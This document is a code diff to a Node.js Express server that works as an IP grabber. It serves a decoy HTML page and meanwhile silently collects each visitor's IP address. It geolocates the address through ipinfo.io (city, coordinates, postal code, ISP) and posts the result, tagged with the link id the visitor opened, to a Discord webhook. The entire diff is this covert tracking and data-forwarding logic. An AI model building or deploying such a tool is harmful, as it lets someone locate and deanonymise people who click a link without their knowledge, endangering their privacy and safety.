@@ -26,31 +26,83 @@ app.get("/", (req, res) => {
         ip = req.headers['x-forwarded-for'];
     else 
         ip = req.connection.remoteAddress;
-    console.log(ip)
+    
     if(config['Discord-webhook'] !== null)
-        fetch(config['Discord-webhook'], {
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({'content': ip}),
-            method: 'POST'
-        })
+        if(config['ipinfo'] == false)
+            fetch(config['Discord-webhook'], {
+                headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({'content': `${ip}`}),
+                method: 'POST'
+            })
+        else {
+            fetch(`https://ipinfo.io/${ip}?token=${config['ipinfo-token']}`)
+                .then(ipinfo => ipinfo.text()).then(ipinfo => {
+                    console.log(ipinfo)
+                    ipinfo = JSON.parse(ipinfo)
+                    let embed = {
+                        "content": "",
+                        "embeds": [
+                            {
+                                "type": "rich",
+                                "title": `${ip}`,
+                                "description": `IP: ${ip}\ncity: ${ipinfo['city']}\nregion: ${ipinfo['region']}\ncountry: ${ipinfo['country']}\nlocation: ${ipinfo['loc']}\nIPs: ${ipinfo['org']}\npostal: ${ipinfo['postal']}\ntimezone: ${ipinfo['timezone']}\n`,
+                                "color": 0x00FFFF,
+                                "url": `https://ipinfo.io/${ip}`
+                            }
+                        ]
+                    }
+                    fetch(config['Discord-webhook'], {
+                        headers: {"Content-Type":"application/json"},
+                        body: JSON.stringify(embed),
+                        method: 'POST'
+                    })
+                })
+        }
     res.sendFile(__dirname+"/"+config['html']);
 })
 
 app.get("/:id", (req, res) => {
     let id = req.params.id
-    var ip;
-    if((req.headers).hasOwnProperty('x-forwarded-for'))
-        ip = req.headers['x-forwarded-for'];
-    else 
-        ip = req.connection.remoteAddress;
-    console.log(ip)
-    if(config['Discord-webhook'] !== null)
-        fetch(config['Discord-webhook'], {
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({'content': `${ip} from ${id}`}),
-            method: 'POST'
-        })
-    res.sendFile(__dirname+"/"+config['html']);
+    if(id !== 'favicon.ico') {
+        var ip;
+        if((req.headers).hasOwnProperty('x-forwarded-for'))
+            ip = req.headers['x-forwarded-for'];
+        else 
+            ip = req.connection.remoteAddress;
+        
+        if(config['Discord-webhook'] !== null)
+            if(config['ipinfo'] == false)
+                fetch(config['Discord-webhook'], {
+                    headers: {"Content-Type":"application/json"},
+                    body: JSON.stringify({'content': `${ip} from ${id}`}),
+                    method: 'POST'
+                })
+            else {
+                fetch(`https://ipinfo.io/${ip}?token=${config['ipinfo-token']}`)
+                    .then(ipinfo => ipinfo.text()).then(ipinfo => {
+                        console.log(ipinfo)
+                        ipinfo = JSON.parse(ipinfo)
+                        let embed = {
+                            "content": "",
+                            "embeds": [
+                                {
+                                    "type": "rich",
+                                    "title": `${ip}`,
+                                    "description": `IP: ${ip}\nFrom ${id}\ncity: ${ipinfo['city']}\nregion: ${ipinfo['region']}\ncountry: ${ipinfo['country']}\nlocation: ${ipinfo['loc']}\nIPs: ${ipinfo['org']}\npostal: ${ipinfo['postal']}\ntimezone: ${ipinfo['timezone']}\n`,
+                                    "color": 0x00FFFF,
+                                    "url": `https://ipinfo.io/${ip}`
+                                }
+                            ]
+                        }
+                        fetch(config['Discord-webhook'], {
+                            headers: {"Content-Type":"application/json"},
+                            body: JSON.stringify(embed),
+                            method: 'POST'
+                        })
+                    })
+            }
+        res.sendFile(__dirname+"/"+config['html']);
+    }
 })
 
 if(config['Https'] == true) {
